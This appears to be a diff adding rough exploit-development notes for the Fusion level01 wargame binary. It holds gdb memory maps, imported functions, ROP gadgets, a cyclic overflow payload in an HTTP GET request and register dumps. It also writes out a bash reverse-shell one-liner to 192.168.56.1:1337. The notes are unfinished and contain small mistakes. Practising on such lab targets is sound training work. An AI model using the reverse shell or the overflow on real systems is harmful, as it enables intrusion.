@@ -1,0 +1,221 @@
+
+initial proc mappings
+
+  (gdb) info proc mappings
+  process 14456
+  cmdline = '/opt/fusion/bin/level01'
+  cwd = '/'
+  exe = '/opt/fusion/bin/level01'
+  Mapped address spaces:
+
+    Start Addr   End Addr       Size     Offset objfile
+     0x8048000  0x804b000     0x3000          0       /opt/fusion/bin/level01
+     0x804b000  0x804c000     0x1000     0x2000       /opt/fusion/bin/level01
+    0xb760e000 0xb760f000     0x1000          0        
+    0xb760f000 0xb7785000   0x176000          0       /lib/i386-linux-gnu/libc-2.13.so
+    0xb7785000 0xb7787000     0x2000   0x176000       /lib/i386-linux-gnu/libc-2.13.so
+    0xb7787000 0xb7788000     0x1000   0x178000       /lib/i386-linux-gnu/libc-2.13.so
+    0xb7788000 0xb778b000     0x3000          0        
+    0xb7795000 0xb7797000     0x2000          0        
+    0xb7797000 0xb7798000     0x1000          0           [vdso]
+    0xb7798000 0xb77b6000    0x1e000          0       /lib/i386-linux-gnu/ld-2.13.so
+    0xb77b6000 0xb77b7000     0x1000    0x1d000       /lib/i386-linux-gnu/ld-2.13.so
+    0xb77b7000 0xb77b8000     0x1000    0x1e000       /lib/i386-linux-gnu/ld-2.13.so
+    0xbfcf5000 0xbfd16000    0x21000          0           [stack]
+
+after a reboot of program everything except load address is changed
+
+  (gdb) info proc mappings
+  process 14490
+  cmdline = '/opt/fusion/bin/level01'
+  cwd = '/'
+  exe = '/opt/fusion/bin/level01'
+  Mapped address spaces:
+
+    Start Addr   End Addr       Size     Offset objfile
+     0x8048000  0x804b000     0x3000          0       /opt/fusion/bin/level01
+     0x804b000  0x804c000     0x1000     0x2000       /opt/fusion/bin/level01
+    0xb75ad000 0xb75ae000     0x1000          0        
+    0xb75ae000 0xb7724000   0x176000          0       /lib/i386-linux-gnu/libc-2.13.so
+    0xb7724000 0xb7726000     0x2000   0x176000       /lib/i386-linux-gnu/libc-2.13.so
+    0xb7726000 0xb7727000     0x1000   0x178000       /lib/i386-linux-gnu/libc-2.13.so
+    0xb7727000 0xb772a000     0x3000          0        
+    0xb7734000 0xb7736000     0x2000          0        
+    0xb7736000 0xb7737000     0x1000          0           [vdso]
+    0xb7737000 0xb7755000    0x1e000          0       /lib/i386-linux-gnu/ld-2.13.so
+    0xb7755000 0xb7756000     0x1000    0x1d000       /lib/i386-linux-gnu/ld-2.13.so
+    0xb7756000 0xb7757000     0x1000    0x1e000       /lib/i386-linux-gnu/ld-2.13.so
+    0xbf9f0000 0xbfa11000    0x21000          0           [stack]
+
+
+Imported functions
+DYNAMIC RELOCATION RECORDS
+OFFSET   TYPE              VALUE 
+0804b3b0 R_386_GLOB_DAT    __gmon_start__
+0804b480 R_386_COPY        __environ
+0804b484 R_386_COPY        stderr
+0804b488 R_386_COPY        stdin
+0804b4a0 R_386_COPY        stdout
+0804b3c0 R_386_JUMP_SLOT   setsockopt
+0804b3c4 R_386_JUMP_SLOT   dup2
+0804b3c8 R_386_JUMP_SLOT   setresuid
+0804b3cc R_386_JUMP_SLOT   read
+0804b3d0 R_386_JUMP_SLOT   printf
+0804b3d4 R_386_JUMP_SLOT   signal
+0804b3d8 R_386_JUMP_SLOT   memcmp
+0804b3dc R_386_JUMP_SLOT   wait
+0804b3e0 R_386_JUMP_SLOT   htons
+0804b3e4 R_386_JUMP_SLOT   err
+0804b3e8 R_386_JUMP_SLOT   setgroups
+0804b3ec R_386_JUMP_SLOT   accept
+0804b3f0 R_386_JUMP_SLOT   fwrite
+0804b3f4 R_386_JUMP_SLOT   strcpy
+0804b3f8 R_386_JUMP_SLOT   getpid
+0804b3fc R_386_JUMP_SLOT   daemon
+0804b400 R_386_JUMP_SLOT   setrlimit
+0804b404 R_386_JUMP_SLOT   malloc
+0804b408 R_386_JUMP_SLOT   strerror
+0804b40c R_386_JUMP_SLOT   __gmon_start__
+0804b410 R_386_JUMP_SLOT   exit
+0804b414 R_386_JUMP_SLOT   realpath
+0804b418 R_386_JUMP_SLOT   open
+0804b41c R_386_JUMP_SLOT   srand
+0804b420 R_386_JUMP_SLOT   strchr
+0804b424 R_386_JUMP_SLOT   __libc_start_main
+0804b428 R_386_JUMP_SLOT   fprintf
+0804b42c R_386_JUMP_SLOT   execve
+0804b430 R_386_JUMP_SLOT   write
+0804b434 R_386_JUMP_SLOT   bind
+0804b438 R_386_JUMP_SLOT   setvbuf
+0804b43c R_386_JUMP_SLOT   snprintf
+0804b440 R_386_JUMP_SLOT   __errno_location
+0804b444 R_386_JUMP_SLOT   asprintf
+0804b448 R_386_JUMP_SLOT   rand
+0804b44c R_386_JUMP_SLOT   fork
+0804b450 R_386_JUMP_SLOT   errx
+0804b454 R_386_JUMP_SLOT   htonl
+0804b458 R_386_JUMP_SLOT   listen
+0804b45c R_386_JUMP_SLOT   socket
+0804b460 R_386_JUMP_SLOT   setresgid
+0804b464 R_386_JUMP_SLOT   close
+
+
+
+Use bash to create a reverse shell to us
+HOST: nc 1337
+TARGET: /bin/bash -i >& /dev/tcp/192.168.56.1/1337 0>&1
+
+Steps:
+1) load stack with execve
+2) jump to execve in plt
+3) 
+
+
+I sepnt some time trying to work through my own misunderstanding.
+When a function gets overflowed, what happens to esp?  How is ESP not 0x61616161 or whatever as that's what ebp was?
+
+Disassembly Example would be
+   0x08049815 <+0>:	push   esp
+   0x08049816 <+1>:	mov    ebp,esp
+   0x08049818 <+3>:	sub    esp,0x98
+   ..........
+   0x08049853 <+62>:	leave  // mov esp, ebp
+                               // pop ebp
+   0x08049854 <+63>:	ret
+
+    
+        | varX     
+        | ....                  
+0xbf..  | ebp       | ebp       | 0x61616161     <== ebp points here at start of function
+        | eip       | eip       | 0x08048000
+        | arg0      | arg0      | 0x00000001
+    
+   push esp      //save ebp onto the stack, this will be overwritten with overflow
+   mov esp, ebp  //ebp contains top of stack at this point, 0xbf..
+   
+   leave         //restores esp with, mov esp, ebp  but ebp = & 0x61616161, that's why it's not AAAA
+   
+    
+Our stack looks like
+
+
+
+UNK:  
+     |real path = 128 bytes
+     |
+     |ebp      
+     |eip      
+     |char*
+     |char* path
+     |buffer
+
+At time of shell code execution:
+
+     | char* q
+     | char* path
+     | buffer
+
+   *q -> "HTTP/1.1"
+   q+8 would be our shellcode but it would contain those rop instructions
+   q+8+len(rop shellcode) will point to NOPsled
+
+Rop gadget for getting char* q
+Potentially useful gadgets
+0x080488b8: pop ebx ; ret
+0x08049a94: pop ebx ; ret
+
+0x08048f85: retn 0x00B8 ;  (1 found)
+0x08048fc8: retn 0x00B8 ;  (1 found)
+
+0x08049f4f: jmp esp ; 
+
+0x080488b5: add esp, 0x08 ; pop ebx ; ret
+
+
+add reg, immediate
+the code I'm looking to execute is:
+
+loop this:
+   retn 0xB8 
+
+then call this:
+   jmp esp
+          EIP                                                                                                                                      rop1 rop2  /HTTP1.1 ESP+0xb8
+GET Aa0Aa 1Aa2 Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5A e6Ae 7Ae8 Ae9Af0Af1 Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5 HTTP/1.1
+
+139 bytes of A
+4 bytes return address
+13 bytes of garbage
+4 bytes return address
+
+
+(gdb) i r
+eax            0x1	1
+ecx            0xb75ad8d0	-1218783024
+edx            0xbfa0f1c7	-1079971385
+ebx            0xb7725ff4	-1217241100
+esp            0xbfa0f190	0xbfa0f190
+ebp            0x41356541	0x41356541
+esi            0xbfa0f27b	-1079971205
+edi            0x8049ed1	134520529
+eip            0x65413665	0x65413665
+eflags         0x10246	[ PF ZF IF RF ]
+cs             0x73	115
+ss             0x7b	123
+ds             0x7b	123
+es             0x7b	123
+fs             0x0	0
+gs             0x33	51
+
+(gdb) x/20wx $esp
+0xbfa0f190:	0x38654137	0x41396541	0x66413066	0x32664131
+0xbfa0f1a0:	0x41336641	0x66413466	0x36664135	0x41376641
+0xbfa0f1b0:	0x66413866	0x30674139	0x41316741	0x67413267
+0xbfa0f1c0:	0x34674133	0x00356741	0x62413961	0x31624130
+0xbfa0f1d0:	0x41326241	0x62413362	0x35624134	0x41366241
+
+(gdb) x/4s $esp+0xb8
+0xbfa0f248:	 "Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5"
+
+
+
